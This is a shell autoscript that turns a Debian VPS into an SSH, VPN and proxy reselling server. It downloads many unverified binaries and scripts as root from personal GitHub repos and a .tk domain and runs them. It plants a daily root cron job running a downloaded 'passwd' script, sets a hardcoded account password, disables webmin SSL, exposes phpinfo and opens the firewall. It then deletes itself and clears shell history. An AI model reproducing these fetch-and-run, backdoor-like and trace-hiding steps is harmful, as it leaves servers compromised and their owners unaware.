#!/bin/sh

#Requirement
if [ ! -e /usr/bin/curl ]; then
    apt-get -y update && apt-get -y upgrade
	apt-get -y install curl
fi
# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(curl -4 icanhazip.com)
if [ $MYIP = "" ]; then
   MYIP=`ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1`;
fi
MYIP2="s/xxxxxxxxx/$MYIP/g";

# go to root
cd

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

#Add DNS Server ipv4
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf
sed -i '$ i\echo "nameserver 8.8.8.8" > /etc/resolv.conf' /etc/rc.local
sed -i '$ i\echo "nameserver 8.8.4.4" >> /etc/resolv.conf' /etc/rc.local

# install wget and curl
apt-get update;apt-get -y install wget curl;

# set time GMT +8
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime

# set repo
cat > /etc/apt/sources.list <<END2
deb http://security.debian.org/ jessie/updates main contrib non-free
deb-src http://security.debian.org/ jessie/updates main contrib non-free
deb http://http.us.debian.org/debian jessie main contrib non-free
deb http://packages.dotdeb.org jessie all
deb-src http://packages.dotdeb.org jessie all
END2
wget "http://www.dotdeb.org/dotdeb.gpg"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg

# remove unused
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;
apt-get -y purge sendmail*
apt-get -y remove sendmail*

# update
apt-get update; apt-get -y upgrade;

# install webserver
apt-get -y install nginx php5-fpm php5-cli

# install essential package
echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
apt-get -y install build-essential
apt-get -y install libio-pty-perl libauthen-pam-perl apt-show-versions

# disable exim
service exim4 stop
sysv-rc-conf exim4 off

# update apt-file
apt-file update

# setting vnstat
vnstat -u -i eth0
service vnstat restart
# install webserver
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "http://autoscriptnobita.tk/rendum/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Powered By Fawzya.Net</pre>" > /home/vps/public_html/index.html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf "http://autoscriptnobita.tk/rendum/vps.conf"
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
service php5-fpm restart
service nginx restart
service nginx restart

# setting port ssh
sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i '/Port 22/a Port  90' /etc/ssh/sshd_config
sed -i 's/Port 22/Port  22/g' /etc/ssh/sshd_config
service ssh restart

# install dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110"/g' /etc/default/dropbear
sed -i 's/DROPBEAR_BANNER=""/DROPBEAR_BANNER="\/etc\/issue.net"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
service dropbear restart
# install banner
cd
wget -O /etc/issue.net https://raw.githubusercontent.com/BlackHand7752/-myhand03/master/banner.txt
chmod +x /usr/bin/bannermenu
service dropbear restart
#Upgrade to Dropbear 2016
cd
apt-get install zlib1g-dev
wget https://raw.githubusercontent.com/chunyen91/0109475453/master/dropbear-2016.74.tar.bz2
bzip2 -cd dropbear-2016.74.tar.bz2 | tar xvf -
cd dropbear-2016.74
./configure
make && make install
mv /usr/sbin/dropbear /usr/sbin/dropbear.old
ln /usr/local/sbin/dropbear /usr/sbin/dropbear
cd && rm -rf dropbear-2016.74 && rm -rf dropbear-2016.74.tar.bz2
service dropbear restart

# install vnstat gui
cd /home/vps/public_html/
wget https://raw.githubusercontent.com/chunyen91/0109475453/master/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
cd

# install fail2ban
apt-get -y install fail2ban
service fail2ban restart

# install squid3
apt-get -y install squid3
cat > /etc/squid3/squid.conf <<-END
acl localhost src 127.0.0.1/32 ::1
acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
acl SSH dst xxxxxxxxx-xxxxxxxxx/32
http_access allow SSH
http_access allow manager localhost
http_access deny manager
http_access allow localhost
http_access deny all
http_port 8080
http_port 8000
http_port 80
coredump_dir /var/spool/squid3
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname Proxy.0109475453.net
END
sed -i $MYIP2 /etc/squid3/squid.conf;
service squid3 restart

# install webmin
cd
wget "https://raw.githubusercontent.com/chunyen91/0109475453/master/webmin_1.801_all.deb"
dpkg --install webmin_1.801_all.deb;
apt-get -y -f install;
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
rm /root/webmin_1.801_all.deb
service webmin restart
service vnstat restart

#install PPTP
apt-get -y install pptpd
cat > /etc/ppp/pptpd-options <<END
name pptpd
refuse-pap
refuse-chap
refuse-mschap
require-mschap-v2
require-mppe-128
ms-dns 8.8.8.8
ms-dns 8.8.4.4
proxyarp
nodefaultroute
lock
nobsdcomp
END

cat > /etc/pptpd.conf <<END
option /etc/ppp/pptpd-options
logwtmp
localip 10.1.0.1
remoteip 10.1.0.5-100
END

cat >> /etc/ppp/ip-up <<END
ifconfig ppp0 mtu 1400
END
mkdir /var/lib/premium-script
/etc/init.d/pptpd restart

# install mrtg
wget -O /etc/snmp/snmpd.conf "https://raw.githubusercontent.com/chunyen91/0109475453/master/snmpd.conf"
wget -O /root/mrtg-mem.sh "https://raw.githubusercontent.com/chunyen91/0109475453/master/mrtg-mem.sh"
chmod +x /root/mrtg-mem.sh
cd /etc/snmp/
sed -i 's/TRAPDRUN=no/TRAPDRUN=yes/g' /etc/default/snmpd
service snmpd restart
snmpwalk -v 1 -c public localhost 1.3.6.1.4.1.2021.10.1.3.1
mkdir -p /home/vps/public_html/mrtg
cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg.cfg public@localhost
curl "https://raw.githubusercontent.com/chunyen91/0109475453/master/mrtg.conf" >> /etc/mrtg.cfg
sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg.cfg
sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg.cfg
indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg.cfg
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
cd

# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/client.ovpn"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
cd;wget https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash dragon
echo "Wutoh:369" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear

#Setting USW
apt-get install ufw
ufw allow ssh
ufw allow 1194/tcp
sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
cat > /etc/ufw/before.rules <<-END
# START OPENVPN RULES
# NAT table rules
*nat
:POSTROUTING ACCEPT [0:0]
# Allow traffic from OpenVPN client to eth0
-A POSTROUTING -s 10.8.0.0/8 -o eth0 -j MASQUERADE
COMMIT
# END OPENVPN RULES
END
ufw enable
ufw status
ufw disable

# set ipv4 forward
echo 1 > /proc/sys/net/ipv4/ip_forward
sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf

# install badvpn
wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/chunyen91/0109475453/master/badvpn-udpgw"
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/chunyen91/0109475453/master/badvpn-udpgw64"
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300


# text gambar
apt-get install boxes

# color text
cd
rm -rf /root/.bashrc
wget -O /root/.bashrc "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/.bashrc"

# install lolcat
sudo apt-get -y install ruby
sudo gem install lolcat

# download script
cd
wget -O /usr/bin/motd "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/motd"
wget -O /usr/bin/benchmark "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/benchmark.sh"
wget -O /usr/bin/speedtest "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/speedtest_cli.py"
wget -O /usr/bin/ps-mem "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/ps_mem.py"
wget -O /usr/bin/dropmon "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/dropmon.sh"
wget -O /usr/bin/menu "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/menu.sh"
wget -O /usr/bin/user-active-list "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/user-active-list.sh"
wget -O /usr/bin/user-add "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/user-add.sh"
wget -O /usr/bin/user-add-pptp "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/user-add-pptp.sh"
wget -O /usr/bin/user-del "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/user-del.sh"
wget -O /usr/bin/disable-user-expire "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/disable-user-expire.sh"
wget -O /usr/bin/delete-user-expire "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/delete-user-expire.sh"
wget -O /usr/bin/banned-user "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/banned-user.sh"
wget -O /usr/bin/unbanned-user "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/unbanned-user.sh"
wget -O /usr/bin/user-expire-list "https://raw.githubusercontent.com/BlackHand7752/-myhand03/master/user-expire-list.sh"
wget -O /usr/bin/user-gen "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/user-gen.sh"
wget -O /usr/bin/userlimit.sh "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/userlimit.sh"
wget -O /usr/bin/userlimitssh.sh "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/userlimitssh.sh"
wget -O /usr/bin/user-list "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/user-list.sh"
wget -O /usr/bin/user-login "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/user-login.sh"
wget -O /usr/bin/user-pass "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/user-pass.sh"
wget -O /usr/bin/user-renew "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/user-renew.sh"
wget -O /usr/bin/clearcache.sh "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/clearcache.sh"
wget -O /usr/bin/bannermenu "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/bannermenu"
cd

#rm -rf /etc/cron.weekly/
#rm -rf /etc/cron.hourly/
#rm -rf /etc/cron.monthly/
rm -rf /etc/cron.daily/
wget -O /root/passwd "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/0109475453/sparepart/passwd.sh"
chmod +x /root/passwd
echo "01 23 * * * root /root/passwd" > /etc/cron.d/passwd

echo "*/30 * * * * root service dropbear restart" > /etc/cron.d/dropbear
echo "00 23 * * * root /usr/bin/disable-user-expire" > /etc/cron.d/disable-user-expire
echo "0 */12 * * * root /sbin/reboot" > /etc/cron.d/reboot
#echo "00 01 * * * root echo 3 > /proc/sys/vm/drop_caches && swapoff -a && swapon -a" > /etc/cron.d/clearcacheram3swap
echo "*/30 * * * * root /usr/bin/clearcache.sh" > /etc/cron.d/clearcache1

cd
chmod +x /usr/bin/motd
chmod +x /usr/bin/benchmark
chmod +x /usr/bin/speedtest
chmod +x /usr/bin/ps-mem
#chmod +x /usr/bin/autokill
chmod +x /usr/bin/dropmon
chmod +x /usr/bin/menu
chmod +x /usr/bin/user-active-list
chmod +x /usr/bin/user-add
chmod +x /usr/bin/user-add-pptp
chmod +x /usr/bin/user-del
chmod +x /usr/bin/disable-user-expire
chmod +x /usr/bin/delete-user-expire
chmod +x /usr/bin/banned-user
chmod +x /usr/bin/unbanned-user
chmod +x /usr/bin/user-expire-list
chmod +x /usr/bin/user-gen
chmod +x /usr/bin/userlimit.sh
chmod +x /usr/bin/userlimitssh.sh
chmod +x /usr/bin/user-list
chmod +x /usr/bin/user-login
chmod +x /usr/bin/user-pass
chmod +x /usr/bin/user-renew
chmod +x /usr/bin/clearcache.sh
chmod +x /usr/bin/bannermenu
cd

# finalisasi
apt-get -y autoremove
chown -R www-data:www-data /home/vps/public_html
service nginx start
service php5-fpm start
service vnstat restart
service openvpn restart
service snmpd restart
service ssh restart
service dropbear restart
service fail2ban restart
service squid3 restart
service webmin restart
service pptpd restart
sysv-rc-conf rc.local on

#clearing history
history -c

## info
echo ""  | tee -a log-install.txt
echo "Informasi Server"  | tee -a log-install.txt
echo "   - Timezone    : Asia/Kuala_Lumpur (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban    : [on]"  | tee -a log-install.txt
echo "   - IPtables    : [on]"  | tee -a log-install.txt
echo "   - Auto-Reboot : [off]"  | tee -a log-install.txt
echo "   - IPv6        : [off]"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "Informasi Aplikasi & Port"  | tee -a log-install.txt
echo "   - OpenVPN     : TCP 1194 "  | tee -a log-install.txt
echo "   - OpenSSH     : 22, 143"  | tee -a log-install.txt
echo "   - Dropbear    : 109, 110, 443"  | tee -a log-install.txt
echo "   - Squid Proxy : 80, 3128, 8000, 8080 (limit to IP Server)"  | tee -a log-install.txt
echo "   - Badvpn      : 7300"  | tee -a log-install.txt
echo "   - Nginx       : 85"  | tee -a log-install.txt
echo "   - PPTP VPN    : 1732"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "Informasi Tools Dalam Server"  | tee -a log-install.txt
echo "   - htop"  | tee -a log-install.txt
echo "   - iftop"  | tee -a log-install.txt
echo "   - mtr"  | tee -a log-install.txt
echo "   - nethogs"  | tee -a log-install.txt
echo "   - screenfetch"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "Informasi Premium Script"  | tee -a log-install.txt
echo "   Perintah untuk menampilkan daftar perintah: menu"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "Informasi Penting"  | tee -a log-install.txt
echo -e "\e[38;5;198m   - Download Config OpenVPN : http://$MYIP:81/client.ovpn"  | tee -a log-install.txt
echo -e "\e[38;5;198m   - Mirror (*.tar.gz)       : http://$MYIP:81/openvpn.tar.gz"  | tee -a log-install.txt
echo -e "\e[38;5;198m   - Webmin                  : http://$MYIP:10000/"  | tee -a log-install.txt
echo -e "\e[38;5;198m   - Vnstat                  : http://$MYIP:81/vnstat/"  | tee -a log-install.txt
echo -e "\e[38;5;198m   - MRTG                    : http://$MYIP:81/mrtg/"  | tee -a log-install.txt
echo -e "\e[38;5;198m   - Log Instalasi           : cat /root/log-install.txt"  | tee -a log-install.txt
echo -e "\e[38;5;198m   - NB: User & Password Webmin adalah sama dengan user & password root"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------- Script Created By FORD7752------------"
